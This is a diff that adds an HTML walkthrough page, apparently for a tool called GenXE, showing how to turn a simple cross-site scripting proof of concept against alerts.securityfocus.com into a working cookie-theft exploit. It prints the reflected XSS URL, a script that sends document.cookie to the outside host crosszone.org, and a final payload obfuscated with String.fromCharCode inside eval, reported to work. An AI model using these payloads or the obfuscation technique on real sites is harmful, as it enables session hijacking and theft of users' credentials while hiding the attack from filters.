@@ -1,0 +1,41 @@
+
+<body bgcolor="#003399">
+<p><font color="#33FFFF" face="Courier New, Courier, mono"><b><font size="5">SimpleXssExploit 
+  --&gt; DesiredXssExploit Walkthrough</font><br>
+  SN:WS1-030921125300<br>
+  <br>
+  </b><font size="3"><b><font size="5"><i>Task Description</i></font></b><br>
+  We have found an XSS at domain <b>alerts.securityfocus.com</b>,<br>
+  Url is here:<br>
+  <i><font size="2">http://alerts.securityfocus.com/ep/alerts-users/index.epl?cid=1&amp;redirect_page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</font></i><br>
+  <br>
+  We want to execute the following shellscript instead of <i><font size="2">alert(document.cookie)</font></i>:<br>
+  <i><font size="2">w=window.open(&quot;about:blank&quot;,&quot;_blank&quot;);<br>
+  w.location.href=&quot;http://crosszone.org/?AddData=&quot;+document.cookie;<br>
+  window.close(); </font></i><br>
+  <font size="5"><br>
+  <b><i>Step-By-Step Walkthrough</i></b></font><br>
+  Step 1/4.Construct Simple Xss exploit that pops up an &quot;alert&quot; messagebox 
+  with text <b>genxea(genxem,genxem)genxea</b><i> </i><br>
+  <br>
+  <i><font size="2">http://alerts.securityfocus.com/ep/alerts-users/index.epl?cid=1&amp;redirect_page=&quot;&gt;&lt;script&gt;alert(&quot;genxea(genxem,genxem)genxea&quot;)&lt;/script&gt;</font></i><br>
+  <br>
+  </font><font color="#33FFFF" face="Courier New, Courier, mono"><font size="3">Step 
+  2/4</font></font><font size="3">.Open GenXE, and choose to generate DesiredXssExploit, 
+  like:<br>
+  <br>
+  <img src="choose.JPG" width="687" height="423"> </font><br>
+  <br>
+  <font color="#33FFFF" face="Courier New, Courier, mono"><font size="3">Step 
+  3/4</font></font><font size="3">.Copy-And-Paste to fill two fields:<br>
+  SimpleXssExploit</font> And DesiredShellscript.<br>
+  <br>
+  <font size="3">Step 4/4</font>.Press the button<br>
+  <img src="generatebutton.JPG" width="349" height="122"> <br>
+  <br>
+  At last, we get this:<br>
+  </font><font color="#33FFFF" face="Courier New, Courier, mono" size="2"><i>http://alerts.securityfocus.com/ep/alerts-users/index.epl?cid=1&amp;redirect_page=&quot;&gt;&lt;script&gt;eval(&quot;eval(String.fromCharCode(119,61,119,105,110,100,111,119,46,111,112,101,110,40,34,97,98,111,117,116,58,98,108,97,110,107,34,44,34,95,98,108,97,110,107,34,41,59,10,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,34,104,116,116,112,58,47,47,99,114,111,115,115,122,111,110,101,46,111,114,103,47,63,65,100,100,68,97,116,97,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59,10,119,105,110,100,111,119,46,99,108,111,115,101,40,41,59,32,10))&quot;)&lt;/script&gt;<br>
+  </i></font><font color="#33FFFF" face="Courier New, Courier, mono">It works 
+  as we expected.<br>
+  <br>
+  </font></p>
